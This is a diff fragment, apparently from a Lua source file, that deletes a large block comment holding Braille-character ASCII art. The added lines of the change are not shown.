@@ -1,177 +1,1011 @@
---[[
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⡀⢀⠀⠄⢠⠐⡀⢂⠐⡀⠠⠀⣴⠏⣰⠯⡽⣙⢮⡽⣩⠯⣝⠾⣙⢮⡝⡮⣝⠾⣙⢮⡝⢧⡻⡭⢏⣝⣣⢯⠽⣹⠮⡽⡭⢯⢽⡹⢮⡽⢭⢯⡽⢭⢯⡽⢭⢯⡝⣞⣭⠻⡼⢭⡳⣭⢛⡼⣭⢳⡭⢳⡝⢮⡱⡀⠹⣧⡀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⡆⡐⢀⠂⡐⢀⠂⡐⠀⠀⠀⠀⠀⠀⠀⠀⡀⠠⠐⡀⢁⠂⢄⠡⡐⠤⢈⠒⡀⢂⠐⡀⠂⠀⠄⣸⡏⢰⡝⢞⡱⠏⠞⠒⠃⠉⠈⢁⡁⣀⣀⣀⣀⣀⣁⡈⠈⠁⠓⠹⠭⢚⡜⣎⠯⢧⡻⢵⣹⢋⡶⣹⡓⢾⣙⠾⣜⣏⠾⣜⠯⡶⣙⢮⠖⣯⣙⢧⡳⣍⣏⠶⣣⠳⣭⢓⡞⣣⢳⡹⣄⠘⣷⡄⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠐⡀⢂⠐⡀⢂⠐⡀⠠⢀⠂⡐⠠⢁⠂⡄⢡⠒⡈⠤⣉⠢⡑⠰⡈⢂⠐⡀⣂⣰⣤⡷⠟⠛⠉⣁⣀⣀⢤⡠⢤⡒⢶⡸⣍⢏⡳⣜⢣⠞⣜⡲⢣⡎⡵⢫⡝⢶⠲⣤⠤⣄⡈⠙⠲⠙⣞⡴⢫⢞⣥⢛⢧⢞⡹⡼⢬⣛⡼⡹⡼⣙⡎⣟⡴⣋⢮⡵⢳⢬⡳⣍⠳⣥⢫⡜⡥⢇⡳⡜⣆⠈⢿⡄⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⢂⠐⡀⢂⠐⡀⠂⠤⡁⢆⠒⡌⢡⠊⡔⣈⠆⡱⢈⠖⡠⢃⠌⡡⣐⣦⡶⠟⢋⣉⢤⠲⡜⣭⢛⡴⢣⠞⣦⡙⢧⡙⢧⠳⣌⢧⠳⣌⢏⡞⣥⢋⠷⡸⣍⠳⣎⢧⡛⡴⣛⡴⢭⡓⣦⠤⡀⠉⠣⢏⡖⣫⠞⣎⠷⣙⡳⡜⢶⡹⣱⢣⡝⢦⢳⣙⠦⣏⠧⣇⢳⡜⡹⢆⡳⣜⡱⣋⠶⣉⠶⣡⠈⢿⡄
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⡀⢂⠐⡀⠂⠄⡁⢆⠱⣈⠖⠬⣡⠚⣄⠣⠜⡡⢊⡔⢡⢊⣴⠿⠛⣁⠴⣊⠷⣘⢎⡳⣙⠦⣫⢜⣣⢛⡴⣙⠮⣙⢎⠳⡜⢎⡳⡜⠮⣜⢢⢏⡚⡕⢎⡳⠜⣦⡙⠶⡱⢎⢧⡙⢦⢫⡕⣣⢦⣀⠈⠑⢏⢮⡹⢥⢳⡙⢮⡱⢣⡓⢮⣙⠦⣝⠺⣌⡳⢬⠳⣜⡱⣋⠶⣡⠇⣧⠹⣌⠳⡜⣂⠈⣿
-⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠐⡀⠂⠄⡁⢂⠐⣌⢣⠒⣌⠓⡤⢃⢆⡱⢊⡑⠢⣼⡶⠟⣁⠴⣩⢎⢳⡩⢎⠵⣊⠵⣊⠵⣃⠞⣤⠫⡔⢣⡚⢥⣊⠳⣌⢣⠕⢮⢱⢊⠶⣨⠱⢎⢣⡜⡹⢤⠹⡱⢍⠞⣢⢝⣊⠧⣚⠵⣢⠝⣚⠦⡄⠈⠱⣋⠶⣙⢎⡵⢣⡝⢦⡙⡞⢬⠳⡥⢛⡬⢳⡌⢧⡱⢍⡖⡹⢤⠛⡤⢛⠴⣉⠆⠸
-⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠂⠄⡁⢂⠐⡀⠂⣜⢢⡛⢤⣋⠴⣉⢆⠲⡡⣼⡿⠋⣠⢒⡍⢮⡑⢮⡑⣎⠭⣒⡱⢎⣌⠳⣌⠹⣄⠳⣉⠦⡙⢦⡘⡱⢌⢆⡋⣆⠣⢎⠲⣡⢋⡜⢢⠜⡱⢊⠵⣉⠮⡙⠴⣊⠴⣋⠴⡓⣬⠚⡥⡚⣍⠳⣄⠈⠳⣘⠮⣔⢣⠞⣡⠝⣬⠣⣝⢸⡑⢮⡱⢜⡡⢞⡡⢎⡱⢣⠹⡘⢥⠚⡤⢣⠀
-⠀⠄⡁⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠌⠐⡀⢂⠐⡀⠡⣘⠦⣙⠶⣌⢳⡱⢎⣳⣵⠟⢁⠴⢣⠭⡜⢢⡙⢦⠱⡌⠶⣡⠚⡴⣈⠳⢌⠳⣨⠱⣌⠲⣉⠦⡑⡱⢊⠦⡱⢌⠳⢌⠓⡤⢃⡜⡡⢎⡱⣉⠖⡡⢎⡱⢣⢌⠳⣌⠲⡑⢦⡙⡔⠳⣌⠳⡌⢖⣀⠈⠲⡘⢦⡙⢦⡙⢤⠛⡤⢓⠬⢣⠜⡢⢝⢢⡙⢆⢣⢃⠧⡙⢦⡙⡔⢣⠂
-⢈⡐⠄⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣇⢈⡐⠠⣀⠂⢄⠡⣘⢧⣙⡞⣬⢧⡹⣮⣿⠃⡐⢎⢎⡱⢎⡜⣡⠚⡤⢓⡌⠳⣄⠫⢔⡡⢋⠬⣑⠢⣑⢂⡓⢌⢢⡑⡡⢎⠒⡡⢎⢢⢉⠎⡰⢡⠢⣑⠢⣑⠢⣉⠖⡡⢒⡡⢎⡑⢢⢣⢙⢢⠱⣌⠓⡬⢱⡘⣌⠲⡄⡀⠙⢢⡙⢤⡙⠦⡙⠴⣉⢎⡱⢊⡕⣊⠦⡙⡌⢆⡋⢖⢩⠒⡜⢨⡑⡂
-⠰⡨⢜⡩⢍⢭⡩⢍⡭⢍⢧⡛⣜⣣⠟⣜⢣⡝⣬⠳⣜⡳⣍⡟⣮⢳⡭⢶⡹⣞⡵⣫⢷⡿⠁⡰⣉⠎⢦⡑⢎⠴⢡⡙⠔⣣⠘⣅⠊⡕⡊⡔⡉⠦⣁⠞⡠⢃⠜⢢⡁⠦⡑⡌⢒⢡⠊⡔⢌⡒⢡⢃⡒⠡⠎⣄⠓⢤⢊⠱⠌⡔⢊⠬⡑⢢⡉⠦⡑⡌⣚⠰⢃⡜⠤⢓⠬⡑⡀⠐⡉⠖⡬⡑⣍⠲⢡⠎⡔⢣⠜⠤⢣⠱⡘⠦⡙⡌⠆⡭⢨⠅⣒⠡
-⡱⡑⣎⠴⣋⢦⣙⢮⡜⢯⠶⣙⡎⢶⡹⣎⡳⣼⢲⣻⣜⣳⡽⣞⡷⣯⣟⣷⢻⣮⢷⣻⣿⠃⢰⠱⣌⠚⡔⡸⢌⠚⡤⢃⠭⣀⠇⢢⠍⡰⢡⠒⣉⠒⠤⢊⠔⡡⢊⠆⡘⠤⡑⠌⡌⢢⠑⡌⠢⢌⠡⠒⡌⠱⡁⢆⡉⠆⡌⢆⠩⠔⡉⢆⠱⢡⠘⢢⢑⠢⢡⠎⡡⠜⣈⠇⠬⡑⢆⡀⠈⠱⡐⠥⠢⢍⡒⢸⢈⠖⡨⢃⠥⢃⡱⢊⠴⣁⢋⡔⠡⠎⡄⢣
-⡱⡱⢎⡳⢭⢶⡹⣎⡽⡭⣞⡵⣫⢷⡽⣞⣽⡷⣿⣷⣿⣿⣿⢿⣿⣷⣿⣾⣿⣿⣿⣿⠇⢀⠣⠜⣠⠋⡔⣡⢊⠱⡰⢉⡒⡐⡊⢅⢊⡑⢢⠑⡌⠬⡑⢌⠢⡑⢌⠢⡑⢢⠑⡌⠰⡁⠎⠰⡁⠎⡰⠡⢌⡑⢌⠢⡘⠤⡑⢌⡘⠰⡁⢎⡘⠤⡙⢄⡊⡑⢢⠘⠤⡙⠄⢎⠱⣈⢒⠰⠀⠐⣉⠒⣉⠆⣘⠡⢊⠴⣁⠣⢊⠅⢆⢃⡒⢌⠢⢌⠱⡘⢄⠣
-⡵⢭⡳⣝⣫⢶⡹⣜⣳⡽⣾⣵⡿⣯⣿⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⢎⡡⠓⣄⠣⢒⠤⢊⡱⢐⠣⣐⠡⠜⡈⢆⡘⢄⠣⡘⠤⢑⡈⠆⡡⠊⡄⡑⢂⠡⠌⡑⢠⡈⠡⡐⢡⢂⠑⡂⠔⡈⠆⡑⢂⠅⠢⠌⡑⢌⠰⡈⢆⡑⢢⠐⡡⢂⠍⢢⠑⡊⢌⠒⡰⢈⠆⡅⠀⢀⠃⠦⡘⢄⠣⢡⠒⡄⢣⠁⠎⡌⢢⠘⡄⠣⢌⠢⡑⢌⢂
-⣝⣣⢗⣮⢳⣯⢷⣯⣷⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢘⠰⡐⠩⢄⠃⢎⡐⢣⠐⡡⠒⡄⠣⢌⡑⠢⢌⠂⡅⢢⠑⡂⢌⠰⢁⠡⠒⡈⢄⠃⢀⣴⣿⣇⠠⠑⡠⠌⠒⡈⠔⢡⠘⡠⢁⢊⠡⡘⠄⢊⠤⠑⡠⠌⡄⠣⡐⢡⠊⡄⢣⠘⡄⢣⠐⡡⢊⠔⡀⠀⠘⠤⡑⢌⡘⢄⠣⡘⠤⣉⠒⢌⠢⡑⢌⠱⡈⢆⠱⡈⢂
-⣮⣳⣟⣾⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⡈⢆⠩⡑⢌⠸⠠⠜⡠⢃⠅⠣⢌⡑⠢⡐⢡⠂⠥⢘⡀⠆⡡⠌⢂⠌⠢⠑⠈⣠⣶⣿⣿⣿⣿⣆⠠⠁⠜⠠⡁⠎⡀⠆⠡⠌⢠⠒⢠⠉⡄⠢⠑⠤⠑⡠⢃⠘⡄⠱⢈⠄⠣⡐⢡⠊⠔⡡⠊⠔⠀⢈⠐⢌⠢⠘⡄⠣⢘⠰⢠⢉⠂⢆⠡⢊⠰⠐⡌⠰⢈⠂
-⣷⣿⣾⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⡘⢄⠣⡘⠄⠃⠑⠨⠐⠡⢊⠅⢢⠐⡡⢘⡀⠎⡐⠡⡐⠌⡐⠌⡐⠈⢁⣤⣾⣿⣿⣿⣿⣿⣿⣿⣆⠁⡘⠄⡐⢂⠡⠘⡀⠎⢠⠘⡀⠒⢠⠁⢃⢂⠑⡠⠌⠒⡈⠔⡁⢊⠡⡐⢡⠘⠤⢁⠩⠌⡀⠀⠌⠂⡌⢡⢂⠱⢈⠢⢁⠢⢉⠰⡈⠆⣁⠃⡰⢁⠊⠄
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠰⡈⠔⡁⠎⡑⠌⡐⠠⢀⠀⠈⠀⠑⠀⡡⠐⢂⠡⠒⠠⠡⠈⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠌⡐⠠⢁⢂⠡⢈⠄⢂⠡⠘⠠⠘⣀⠢⠌⡐⠈⡔⢁⠒⡈⢄⠃⢌⡐⠌⠄⡃⢌⡐⠁⠀⠈⠔⠠⡁⢢⠘⡠⢁⠎⣀⠣⠄⢡⠒⢠⠘⡀⢂⠉⠀
-⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠐⡈⠆⢡⠘⡠⠑⡈⠅⡂⢀⠢⠄⠀⠀⠀⠁⠈⠀⢁⣡⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠠⢁⠂⠄⢂⠂⠌⣀⠢⢁⠡⠁⠄⢂⠔⡀⢃⠐⠄⢊⠐⡠⠊⠄⡰⢈⠒⡈⠤⢀⠃⠀⠈⠄⠡⠐⡁⢂⠡⠂⠔⡀⠢⠌⠠⠌⣀⠒⡈⠤⠁⢀
-⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠠⠑⣈⠀⠃⠐⠡⠌⠒⠀⠄⡒⠈⠀⢈⣀⣤⣶⣤⡀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠌⡐⠂⠌⡐⢀⠂⠄⢂⠉⡐⢂⠐⡐⢈⠰⠈⢄⠂⢡⠈⠔⡀⠆⠰⠐⣀⠃⠄⠀⠈⠄⠡⠈⢄⡁⢂⢉⡐⠤⠁⠌⠒⠠⠄⢂⠰⢀⠁⣸
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢁⡀⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⣿⣷⣆⡀⠀⠀⠙⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⢀⠁⠄⠠⢀⠈⠠⠀⠆⠠⠀⠆⠰⠘⡀⢁⠄⡈⡀⠸⠀⠶⠈⠃⠴⢀⡈⠀⠀⢁⠈⡀⠁⠄⠰⠘⡀⠠⢀⠁⠜⡀⢁⠘⡀⠆⡀⠀⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠠⠀⣠⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⢿⣿⣷⣦⣤⣀⣠⣾⣿⣿⠈⠉⠉⠉⠛⠛⠛⠛⠛⠛⠛⠳⠀⠈⠀⠁⠂⠌⠠⠁⠌⠄⠡⠈⠄⡡⠐⢂⠐⠠⡐⠡⢈⠤⢁⠉⡐⠄⡐⠀⠀⢂⠐⠠⠁⠌⡐⠡⠀⠅⠂⠌⡐⢀⠂⠔⡀⢂⠁⢰⡏
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⣰⣿⣿⣿⠏⠀⠀⠀⠀⢶⣦⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢻⣿⣿⣿⣿⡿⠷⠶⢶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣄⠀⠀⠀⢀⠀⠀⢀⠀⢀⠀⠀⡀⢀⠈⠔⠠⢁⠂⠰⢀⠡⠐⡈⠄⠀⠐⡀⠂⡁⠌⠐⠠⠁⠌⡠⢁⠂⡐⠠⢈⠐⡀⢂⠀⣾⠃
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⠏⢀⠡⠊⢰⣤⡀⠻⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠉⠉⠉⠙⠛⠛⠿⠿⣿⣷⣄⠁⠂⡈⠐⠠⠈⠄⡈⠐⡀⠂⠌⠠⢁⠂⠌⡐⠠⠌⡐⢀⠂⠀⠠⠐⢀⠐⠠⢁⠂⡁⢂⠐⡀⠂⠄⡁⢂⠐⡀⠂⣸⠏⡔
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⠏⢀⠂⠀⡀⣭⣭⣿⣶⣬⣙⢿⣦⣀⠀⠀⠀⠀⠀⠀⠀⡀⢹⣿⣿⣿⣿⣿⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠁⠂⠁⠂⢀⠐⠠⠁⢈⠐⠠⢈⠐⠠⢁⠂⠰⠀⠀⠀⠂⠐⠠⠀⠡⢀⠂⡐⢀⠂⠄⡁⢂⠐⡀⠂⠄⢠⡿⠱⣈
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⠏⠀⠂⠌⣸⡇⣿⣿⣿⣿⣫⣿⣿⣾⣭⣟⣶⣶⣤⣶⣶⣿⣷⣼⣿⣿⣿⣿⡿⢁⣠⣴⣾⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠂⠈⠐⠂⠌⡐⠠⢈⠐⠀⠀⠂⠁⡈⠀⠌⠐⡀⢂⠐⠠⢈⠐⡀⢂⠐⠠⠁⢀⣾⢍⡓⡌
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠌⡈⢰⣿⡇⣿⣿⣿⣿⣿⣿⣿⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡿⣷⣄⣀⠀⠀⠀⠀⣀⡠⠾⠟⠋⠁⠀⣀⠀⠀⠀⠀⠀⣠⣴⣶⣿⣶⣦⣄⠀⡁⠂⠀⠀⠠⠁⠐⢀⠈⠄⠂⡐⠠⢈⠐⡀⢂⠐⠠⢈⠐⠀⣼⢏⡒⡜⡰
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠌⡐⠀⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣭⣭⣭⣥⣤⣤⣤⣶⣶⣶⣿⡿⠟⠀⠠⢈⠐⢰⣿⣿⣿⣿⣿⣿⣿⣆⠀⠁⠀⡀⠁⠠⠈⠀⠄⠂⠐⡀⠡⢀⠂⡐⠠⠈⡐⠠⠀⣼⡟⢢⡱⢌⡱
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢀⠂⠄⢘⢿⣿⣷⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣹⣿⣿⣦⣻⣿⡿⠀⠀⠐⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⡀⠌⠀⠄⠁⠠⠈⠀⠄⠡⢀⠂⠐⡀⠁⠄⠀⣼⡟⡌⢧⠜⣢⠕
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠠⢈⠀⣼⣷⣮⣝⡂⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠐⠈⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠄⠀⠠⠀⠂⠈⡀⠄⠡⢈⠐⡀⠌⠐⢀⠡⠀⣼⡟⣬⢙⢦⢛⡤⣋
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠂⠄⢺⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⢀⠁⠈⢸⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠂⢀⠐⠀⠁⢀⠀⠂⠄⠂⡀⠐⠈⡀⠀⣼⡟⡜⡴⢋⣎⢳⢢⡑
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠈⡐⠀⢸⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠠⠈⠀⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠈⠀⡀⠀⠠⠀⠈⡀⠠⠁⠂⡐⠀⠁⠂⢀⣼⡟⡼⣘⠶⣩⠚⡤⢃⠌
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠡⠀⢿⣿⣿⣿⣿⣿⣌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠄⠀⢸⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠐⠀⠀⠀⡀⠄⠀⠁⢀⠐⠀⡁⠀⠌⠐⢀⣾⠟⣬⠱⢎⠳⢄⠓⡄⠃⡌
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠁⠄⠈⢻⣿⣿⣿⣿⣿⣷⡌⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠘⠉⠉⠀⠀⠀⠀⠀⠀⠀⢀⠠⠀⠀⠐⠀⠀⠀⢀⠈⠀⠄⠂⢀⠐⠀⢀⣾⢯⡹⣐⠫⢌⠱⡈⠆⠰⠡⡐
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠀⡀⠙⢿⣿⣿⣿⣿⣿⣶⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠈⠀⠀⠌⠀⡐⠀⡀⢀⣾⡟⢆⠳⢌⠒⠌⠒⡠⢉⢂⡑⠄
-⣿⢿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⡀⠉⠛⠿⢿⣿⡿⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⣉⣥⣶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠀⠂⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠁⢀⠂⠀⠄⠀⣼⠯⠜⡩⡘⠤⡉⠜⡠⢑⢂⠢⠐⡌
-⣟⡯⢟⣮⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢛⣉⣥⣴⣾⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠐⠀⠈⠀⠀⠂⠀⣸⢏⡜⢡⡑⢌⠢⠑⡌⠰⡁⢎⠰⣁⠒
-⡳⣞⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⢛⣋⣉⣉⣉⣙⣛⠻⠿⢿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⢠⣤⣭⣯⣿⣯⣭⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠁⠀⠂⠀⣿⠢⡌⠥⡘⢄⢊⠡⡐⢡⠘⡀⠃⠄⡉
-⡿⣼⣳⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢋⣥⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣍⣛⣛⣀⣀⣀⣠⣤⣤⣶⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠁⠀⡀⠁⠀⢸⣇⠣⢘⠐⠡⠈⠄⢂⠐⡀⠂⠄⢁⠂⠄
-⡿⣵⣻⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢡⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠀⠀⠐⠀⢸⡇⢂⠡⠈⠄⠡⢈⠀⢂⠐⠠⠈⡀⠄⠂
-⣟⡷⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢀⠀⠈⣷⠀⠠⠈⠄⠁⠄⡈⠄⠐⡀⢁⠠⠀⠀
